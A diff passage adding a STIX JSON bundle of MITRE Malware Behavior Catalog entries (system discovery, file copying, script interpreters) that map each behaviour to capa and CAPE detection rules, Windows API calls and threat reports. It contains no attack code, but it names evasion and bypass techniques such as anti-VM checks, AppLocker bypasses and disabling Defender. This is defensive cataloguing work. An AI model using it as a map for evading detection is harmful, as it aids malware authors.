@@ -1,0 +1,2797 @@
+{
+    "type": "bundle",
+    "id": "bundle--9e30acee-86ce-419a-8424-7094bedf8239",
+    "objects": [
+        {
+            "type": "malware-behavior",
+            "spec_version": "2.1",
+            "id": "malware-behavior--584dc938-3789-4e53-995e-f914dff31b71",
+            "created_by_ref": "identity--b73c59c1-8560-449a-b8d0-c2ce0533c5bf",
+            "created": "2022-08-02T00:00:00.000Z",
+            "modified": "2024-04-30T00:00:00.000Z",
+            "name": "System Information Discovery",
+            "obj_defn": {
+                "description": "Malware may attempt to get detailed information about the system. This can include details about the operating system, hardware configurations, installed software, system uptime, and other system-level details.\n\nSee ATT&CK: **System Information Discovery ([T1082](https://attack.mitre.org/techniques/T1082/))**.",
+                "external_id": "E1082",
+                "source_name": "mitre-mbc",
+                "url": "https://github.com/MBCProject/mbc-markdown/blob/main/discovery/system-information-discovery.md"
+            },
+            "objective_refs": [
+                "malware-objective--f59acc38-c564-4181-93ef-3c4a5531cf4a"
+            ],
+            "detection_rules": [
+                {
+                    "api_fncs": [
+                        "kernel32.GetEnvironmentVariable",
+                        "kernel32.GetEnvironmentStrings",
+                        "kernel32.ExpandEnvironmentStrings",
+                        "msvcr90.getenv",
+                        "msvcrt.getenv",
+                        "System.Environment::GetEnvironmentVariable",
+                        "System.Environment::GetEnvironmentVariables",
+                        "System.Environment::ExpandEnvironmentVariables"
+                    ],
+                    "rule_name": "query environment variable",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/host-interaction/environment-variable/query-environment-variable.yml"
+                },
+                {
+                    "api_fncs": [
+                        "kernel32.GetDriveType",
+                        "kernel32.GetLogicalDrives",
+                        "kernel32.GetVolumeInformation",
+                        "kernel32.GetVolumeNameForVolumeMountPoint",
+                        "kernel32.GetVolumePathNamesForVolumeName",
+                        "kernel32.GetLogicalDriveStrings",
+                        "kernel32.QueryDosDevice"
+                    ],
+                    "rule_name": "get disk information",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/host-interaction/hardware/storage/get-disk-information.yml"
+                },
+                {
+                    "api_fncs": [
+                        "kernel32.GetDiskFreeSpace",
+                        "kernel32.GetDiskFreeSpaceEx"
+                    ],
+                    "rule_name": "get disk size",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/host-interaction/hardware/storage/get-disk-size.yml"
+                },
+                {
+                    "rule_name": "check OS version",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/host-interaction/os/version/check-os-version.yml"
+                },
+                {
+                    "api_fncs": [
+                        "kernel32.GetComputerName",
+                        "kernel32.GetComputerNameEx",
+                        "GetComputerObjectName",
+                        "ws2_32.gethostname",
+                        "gethostname"
+                    ],
+                    "rule_name": "get hostname",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/host-interaction/os/hostname/get-hostname.yml"
+                },
+                {
+                    "api_fncs": [
+                        "DeviceIoControl",
+                        "NtClose",
+                        "NtCreateFile",
+                        "NtDuplicateObject",
+                        "NtOpenFile",
+                        "NtDeviceIoControlFile"
+                    ],
+                    "rule_name": "antivm_generic_disk",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/antivm_generic_disk.py"
+                },
+                {
+                    "rule_name": "recon_systeminfo",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/recon_systeminfo.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "HttpOpenRequestA",
+                        "HttpSendRequestA"
+                    ],
+                    "rule_name": "recon_beacon",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/recon_beacon.py"
+                },
+                {
+                    "rule_name": "uses_adfind",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/uses_adfind.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "antivm_generic_cpu",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/antivm_generic_cpu.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "accesses_mailslot",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/accesses_netlogon.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "accesses_netlogon_regkey",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/accesses_netlogon.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "antivm_generic_bios",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/antivm_generic_bios.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "antivm_hyperv_keys",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/antivm_hyperv_keys.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "uses_windows_utilities_nltest",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/windows_utilities.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "RegOpenKeyExW",
+                        "RegQueryValueExA",
+                        "RegQueryValueExW",
+                        "RegOpenKeyExA"
+                    ],
+                    "rule_name": "antivm_generic_scsi",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/antivm_generic_scsi.py"
+                },
+                {
+                    "rule_name": "antivm_parallels_keys",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/antivm_parallels_keys.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "antivm_generic_diskreg",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/antivm_generic_diskreg.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "antivm_generic_system",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/antivm_generic_system.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_account_discovery_cmd",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_currently_loggedin_user_cmd",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_info_discovery_cmd",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_info_discovery_pwsh",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_network_discovery_cmd",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_network_discovery_pwsh",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_user_discovery_cmd",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "RegOpenKeyExW",
+                        "RegEnumKeyExW",
+                        "RegEnumKeyExA",
+                        "RegOpenKeyExA"
+                    ],
+                    "rule_name": "antivm_generic_services",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/antivm_generic_services.py"
+                },
+                {
+                    "api_fncs": [
+                        "SetupDiGetClassDevsA",
+                        "SetupDiGetClassDevsW"
+                    ],
+                    "rule_name": "antivm_generic_disk_setupapi",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/antivm_generic_disk_setupapi.py"
+                },
+                {
+                    "api_fncs": [
+                        "rtcEnvironBstr"
+                    ],
+                    "rule_name": "antisandbox_check_userdomain",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/antisandbox_check_userdomain.py"
+                },
+                {
+                    "api_fncs": [
+                        "JsEval",
+                        "COleScript_ParseScriptText",
+                        "COleScript_Compile"
+                    ],
+                    "rule_name": "browser_scanbox",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/browser_scanbox.py"
+                },
+                {
+                    "rule_name": "recon_fingerprint",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/recon_fingerprint.py",
+                    "rule_type": "cape"
+                }
+            ],
+            "obj_version": "2.3",
+            "related_object_refs": [
+                "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1"
+            ],
+            "external_references": [
+                {
+                    "source_name": "trendmicro-ursnif",
+                    "description": "\"PE_URSNIF.A2,\" Trend Micro, analysis report, Dec. 11, 2014 [Online].",
+                    "url": "https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/PE_URSNIF.A2"
+                },
+                {
+                    "source_name": "fsecure-quedagh",
+                    "description": "\"BlackEnergy & Quedagh: The convergence of crimeware and APT attacks,\" F-Secure Labs [Online].",
+                    "url": "https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163408/BlackEnergy_Quedagh.pdf"
+                },
+                {
+                    "source_name": "kujawa",
+                    "description": "A. Kujawa, \"You dirty RAT! Part 1: DarkComet,\" Malwarebytes Labs, blog, Jun. 9, 2012 [Online].",
+                    "url": "https://blog.malwarebytes.com/threat-analysis/2012/06/you-dirty-rat-part-1-darkcomet/"
+                },
+                {
+                    "source_name": "trendmicro-emotet",
+                    "description": "\"Exploring Emotet's Activities,\" Trend Micro Research, 2019 [Online].",
+                    "url": "https://documents.trendmicro.com/assets/white_papers/ExploringEmotetsActivities_Final.pdf"
+                },
+                {
+                    "source_name": "falliere-stuxnet",
+                    "description": "N. Falliere, L. Murchu, and E. Chien, \"W32.Stuxnet Dossier,\" Symantec Security Response, Feb. 2011 [Online].",
+                    "url": "https://docs.broadcom.com/doc/security-response-w32-stuxnet-dossier-11-en"
+                },
+                {
+                    "source_name": "fireeye-apt28",
+                    "description": "\"APT28: A Window into Russia's Cyber Espionage Operations?\" FireEye, 2014 [Online].",
+                    "url": "https://www2.fireeye.com/rs/fireye/images/rpt-apt28.pdf"
+                },
+                {
+                    "source_name": "s2grupo",
+                    "description": "\"Evolution of Trickbot,\" S2 Grupo, report, Jun. 2017 [Online].",
+                    "url": "https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf"
+                },
+                {
+                    "source_name": "mcafee-webcobra",
+                    "description": "\"WebCobra Malware Uses Victims' Computers to Mine Cryptocurrency,\" McAfee, blog, Nov. 12, 2018 [Online].",
+                    "url": "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/webcobra-malware-uses-victims-computers-to-mine-cryptocurrency/"
+                },
+                {
+                    "source_name": "capa analysis",
+                    "description": "Analysis output, capa 4.0, analyzed at MITRE on Oct. 12, 2022.",
+                    "url": "https://github.com/mandiant/capa-rules"
+                },
+                {
+                    "source_name": "hromcov\u00e1",
+                    "description": "Z. Hromcov\u00e1, \"Malicious campaign targets South Korean users with backdoor\u2011laced torrents,\" We Live Security, ESET, Jul. 8, 2019 [Online].",
+                    "url": "https://www.welivesecurity.com/2019/07/08/south-korean-users-backdoor-torrents/"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--093b6375-cd45-4aa3-8f91-6a03ddd7a3d3"
+            ],
+            "extensions": {
+                "extension-definition--d57b7c9c-7fa6-436b-b82c-8e6f69cdc3d0": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "malware-behavior",
+            "spec_version": "2.1",
+            "id": "malware-behavior--7ea1c41a-ed8b-4836-a4bc-48129c33c60b",
+            "created_by_ref": "identity--b73c59c1-8560-449a-b8d0-c2ce0533c5bf",
+            "created": "2020-12-04T00:00:00.000Z",
+            "modified": "2024-02-06T00:00:00.000Z",
+            "name": "Copy File",
+            "obj_defn": {
+                "description": "Malware copies a file.",
+                "external_id": "C0045",
+                "source_name": "mitre-mbc",
+                "url": "https://github.com/MBCProject/mbc-markdown/blob/main/micro-behaviors/file-system/copy-file.md"
+            },
+            "objective_refs": [
+                "malware-objective--b535116e-3bd9-42f6-9615-68f24c7b42ed"
+            ],
+            "detection_rules": [
+                {
+                    "api_fncs": [
+                        "kernel32.CopyFile",
+                        "kernel32.CopyFileEx",
+                        "CopyFile2",
+                        "CopyFileTransacted",
+                        "LZCopy",
+                        "System.IO.FileInfo::CopyTo",
+                        "System.IO.File::Copy",
+                        "kernel32.SHFileOperation"
+                    ],
+                    "rule_name": "copy file",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/host-interaction/file-system/copy/copy-file.yml"
+                },
+                {
+                    "api_fncs": [
+                        "NtCreateUserProcess",
+                        "CreateProcessInternalW"
+                    ],
+                    "class": "InjectionExtension",
+                    "rule_name": "injection_needextension",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/injection_needextension.py"
+                }
+            ],
+            "obj_version": "2.2",
+            "external_references": [
+                {
+                    "source_name": "capa analysis",
+                    "description": "Analysis output, capa 4.0, analyzed at MITRE on Oct. 12, 2022.",
+                    "url": "https://github.com/mandiant/capa-rules"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--093b6375-cd45-4aa3-8f91-6a03ddd7a3d3"
+            ],
+            "extensions": {
+                "extension-definition--d57b7c9c-7fa6-436b-b82c-8e6f69cdc3d0": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "malware-behavior",
+            "spec_version": "2.1",
+            "id": "malware-behavior--819ed2ae-7ed5-4caf-a057-485563efc26f",
+            "created_by_ref": "identity--b73c59c1-8560-449a-b8d0-c2ce0533c5bf",
+            "created": "2022-08-02T00:00:00.000Z",
+            "modified": "2024-04-30T00:00:00.000Z",
+            "name": "Command and Scripting Interpreter",
+            "obj_defn": {
+                "description": "Malware may abuse command and script interpreters to execute commands, scripts, or binaries. This is often done to carry out various malicious activities, such as exploring the system, escalating privileges, or exfiltrating data. Built-in command-line interpreters or scripting environments of the operating system, such as cmd.exe or Powershell on Windows, or Bash on Unix-like systems, are often used. Additionally, adversaries may use other scripting languages like Python, Perl, or Javascript. \n\nSee ATT&CK: **Command and Scripting Interpreter ([T1059](https://attack.mitre.org/techniques/T1059), [T1623](https://attack.mitre.org/techniques/T1623))**.",
+                "external_id": "E1059",
+                "source_name": "mitre-mbc",
+                "url": "https://github.com/MBCProject/mbc-markdown/blob/main/execution/command-and-scripting-interpreter.md"
+            },
+            "objective_refs": [
+                "malware-objective--3336569b-d163-4a42-9b05-9eff0c7ac6d2"
+            ],
+            "detection_rules": [
+                {
+                    "api_fncs": [
+                        "GetCommandLine",
+                        "CommandLineToArgv",
+                        "System.Environment::GetCommandLineArgs"
+                    ],
+                    "rule_name": "accept command line arguments",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/host-interaction/cli/accept-command-line-arguments.yml"
+                },
+                {
+                    "api_fncs": [
+                        "System.Management.Automation.PowerShell::Create",
+                        "System.Management.Automation.PowerShell::AddScript",
+                        "System.Management.Automation.PowerShell::Invoke"
+                    ],
+                    "rule_name": "run PowerShell expression",
+                    "rule_type": "capa",
+                    "url": "https://github.com/mandiant/capa-rules/blob/master/load-code/powershell/run-powershell-expression.yml"
+                },
+                {
+                    "api_fncs": [
+                        "NtWriteFile"
+                    ],
+                    "rule_name": "office_postscript",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/office_exploit.py"
+                },
+                {
+                    "api_fncs": [
+                        "CDocument_write",
+                        "JsEval",
+                        "COleScript_ParseScriptText",
+                        "COleScript_Compile"
+                    ],
+                    "rule_name": "js_suspicious_redirect",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/js_suspicious_redirect.py"
+                },
+                {
+                    "rule_name": "odbcconf_bypass",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/bypass_applocker.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "LdrLoadDll"
+                    ],
+                    "rule_name": "regsvr32_squiblydoo_dll_load",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/bypass_applocker.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "squiblydoo_bypass",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/bypass_applocker.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "squiblytwo_bypass",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/bypass_applocker.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "JsEval"
+                    ],
+                    "rule_name": "exe_dropper_js",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/dropper_js.py"
+                },
+                {
+                    "api_fncs": [
+                        "RegSetValueExA",
+                        "RegSetValueExW",
+                        "NtSetValueKey"
+                    ],
+                    "rule_name": "persistence_registry_script",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/persistence_fileless.py"
+                },
+                {
+                    "rule_name": "ie_martian_children",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/martians_ie.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "ShellExecuteExW",
+                        "NtCreateUserProcess",
+                        "CreateProcessInternalW"
+                    ],
+                    "rule_name": "bcdedit_command",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/bcdedit_command.py"
+                },
+                {
+                    "rule_name": "office_martian_children",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/martians_office.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "JsEval",
+                        "COleScript_ParseScriptText",
+                        "COleScript_Compile"
+                    ],
+                    "rule_name": "js_phish",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/js_phish.py"
+                },
+                {
+                    "rule_name": "disables_winfirewall",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/disables_winfirewall.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "script_tool_executed",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/windows_utilities.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "cmdline_obfuscation",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/cmdline_anomaly.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "cmdline_switches",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/cmdline_anomaly.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "cmdline_terminate",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/cmdline_anomaly.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "cmdline_forfiles_wildcard",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/cmdline_anomaly.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "cmdline_http_link",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/cmdline_anomaly.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "cmdline_long_string",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/cmdline_anomaly.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "cmdline_reversed_http_link",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/cmdline_anomaly.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "long_commandline",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/cmdline_anomaly.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "powershell_renamed_commandline",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/cmdline_anomaly.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "NtCreateUserProcess",
+                        "CreateProcessInternalW"
+                    ],
+                    "rule_name": "wmi_script_process",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/wmi.py"
+                },
+                {
+                    "api_fncs": [
+                        "ShellExecuteExW",
+                        "NtCreateUserProcess",
+                        "CreateProcessInternalW"
+                    ],
+                    "rule_name": "disables_mappeddrives_autodisconnect",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/disables_drives_autodisconnect.py"
+                },
+                {
+                    "rule_name": "system_account_discovery_cmd",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_currently_loggedin_user_cmd",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_info_discovery_cmd",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_info_discovery_pwsh",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_network_discovery_cmd",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_network_discovery_pwsh",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "rule_name": "system_user_discovery_cmd",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/collects_systeminfo_cmd.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "URLDownloadToFileW",
+                        "HttpOpenRequestW",
+                        "send",
+                        "WSAConnect",
+                        "InternetCrackUrlW",
+                        "InternetCrackUrlA",
+                        "InternetReadFile"
+                    ],
+                    "rule_name": "powershell_network_connection",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/powershell_command.py"
+                },
+                {
+                    "rule_name": "powershell_scriptblock_logging",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/powershell_command.py"
+                },
+                {
+                    "rule_name": "powershell_command_suspicious",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/powershell_command.py"
+                },
+                {
+                    "rule_name": "powershell_renamed",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/powershell_command.py"
+                },
+                {
+                    "rule_name": "powershell_reversed",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/powershell_command.py"
+                },
+                {
+                    "rule_name": "powershell_variable_obfuscation",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/powershell_command.py"
+                },
+                {
+                    "api_fncs": [
+                        "LdrGetDllHandle",
+                        "LdrLoadDll"
+                    ],
+                    "rule_name": "office_com_load",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/office_dll_loading.py"
+                },
+                {
+                    "api_fncs": [
+                        "LdrGetDllHandle",
+                        "LdrLoadDll"
+                    ],
+                    "rule_name": "office_vb_load",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/office_dll_loading.py"
+                },
+                {
+                    "api_fncs": [
+                        "LdrGetDllHandle",
+                        "LdrLoadDll"
+                    ],
+                    "rule_name": "office_wmi_load",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/office_dll_loading.py"
+                },
+                {
+                    "api_fncs": [
+                        "NtWriteFile"
+                    ],
+                    "rule_name": "document_script_exe_drop",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/document_exedrop.py"
+                },
+                {
+                    "rule_name": "windows_defender_powershell",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/disables_windefender.py",
+                    "rule_type": "cape"
+                },
+                {
+                    "api_fncs": [
+                        "NtCreateUserProcess",
+                        "CreateProcessInternalW"
+                    ],
+                    "rule_name": "office_suspicious_processes",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/office_suspicious_process.py"
+                },
+                {
+                    "api_fncs": [
+                        "NtCreateUserProcess",
+                        "CreateProcessInternalW"
+                    ],
+                    "rule_name": "script_created_process",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/script_downloader.py"
+                },
+                {
+                    "api_fncs": [
+                        "URLDownloadToFileW",
+                        "HttpOpenRequestW",
+                        "send",
+                        "WSAConnect",
+                        "InternetCrackUrlW",
+                        "InternetCrackUrlA",
+                        "SslEncryptPacket",
+                        "InternetReadFile"
+                    ],
+                    "rule_name": "script_network_activity",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/script_downloader.py"
+                },
+                {
+                    "api_fncs": [
+                        "JsEval",
+                        "COleScript_ParseScriptText"
+                    ],
+                    "rule_name": "suspicious_js_script",
+                    "rule_type": "cape",
+                    "url": "https://github.com/CAPESandbox/community/tree/master/modules/signatures/windows/script_downloader.py"
+                }
+            ],
+            "obj_version": "2.2",
+            "related_object_refs": [
+                "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
+                "attack-pattern--29f1f56c-7b7a-4c14-9e39-59577ea2743c"
+            ],
+            "external_references": [
+                {
+                    "source_name": "njccic-poisonivy",
+                    "description": "\"Poison Ivy,\" NJCCIC Threat Profile, Apr. 12, 2017 [Online].",
+                    "url": "https://www.cyber.nj.gov/threat-center/threat-profiles/trojan-variants/poison-ivy"
+                },
+                {
+                    "source_name": "hromcov\u00e1",
+                    "description": "Z. Hromcov\u00e1, \"Malicious campaign targets South Korean users with backdoor\u2011laced torrents,\" We Live Security, ESET, Jul. 8, 2019 [Online].",
+                    "url": "https://www.welivesecurity.com/2019/07/08/south-korean-users-backdoor-torrents/"
+                },
+                {
+                    "source_name": "bleeping-kovter",
+                    "description": "\"How to remove the Kovter Trojan (Removal Guide),\" Bleeping Computer, Mar. 23, 2016 [Online].",
+                    "url": "https://www.bleepingcomputer.com/virus-removal/remove-kovter-trojan"
+                },
+                {
+                    "source_name": "palotay",
+                    "description": "D. Palotay and P. Mackenzie, \"SamSam Ransomware Chooses Its Targets Carefully,\" Sophos Labs, Apr. 2018 [Online].",
+                    "url": "https://www.sophos.com/en-us/medialibrary/PDFs/technical-papers/SamSam-ransomware-chooses-Its-targets-carefully-wpna.pdf"
+                },
+                {
+                    "source_name": "mundo-shamoon",
+                    "description": "A. Mundo, \"Shamoon Returns to Wipe Systems in Middle East, Europe,\" McAfee, blog, Dec. 14, 2018 [Online].",
+                    "url": "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/shamoon-returns-to-wipe-systems-in-middle-east-europe/"
+                },
+                {
+                    "source_name": "falliere-stuxnet",
+                    "description": "N. Falliere, L. Murchu, and E. Chien, \"W32.Stuxnet Dossier,\" Symantec Security Response, Feb. 2011 [Online].",
+                    "url": "https://docs.broadcom.com/doc/security-response-w32-stuxnet-dossier-11-en"
+                },
+                {
+                    "source_name": "marschalek",
+                    "description": "M. Marschalek, \"EvilBunny: Malware Instrumented by Lua,\" Cyphort Labs, blog, Dec. 16, 2014 [Online].",
+                    "url": "https://web.archive.org/web/20150311013500/http://www.cyphort.com/evilbunny-malware-instrumented-lua/"
+                },
+                {
+                    "source_name": "victor-netwalker",
+                    "description": "K. Victor, \"Reflective Loading Runs Netwalker Fileless Ransomware,\" Trend Micro, May 18, 2020 [Online].",
+                    "url": "https://www.trendmicro.com/en_us/research/20/e/netwalker-fileless-ransomware-injected-via-reflective-loading.html"
+                },
+                {
+                    "source_name": "capa analysis",
+                    "description": "Analysis output, capa 4.0, analyzed at MITRE on Oct. 12, 2022.",
+                    "url": "https://github.com/mandiant/capa-rules"
+                },
+                {
+                    "source_name": "reed-mac",
+                    "description": "T. Reed, \"Mac malware intercepts encrypted web traffic for ad injection,\" Malwarebytes Labs, blog, Oct. 24, 2018 [Online].",
+                    "url": "https://www.malwarebytes.com/blog/news/2018/10/mac-malware-intercepts-encrypted-web-traffic-for-ad-injection"
+                },
+                {
+                    "source_name": "mcafee-webcobra",
+                    "description": "\"WebCobra Malware Uses Victims' Computers to Mine Cryptocurrency,\" McAfee, blog, Nov. 12, 2018 [Online].",
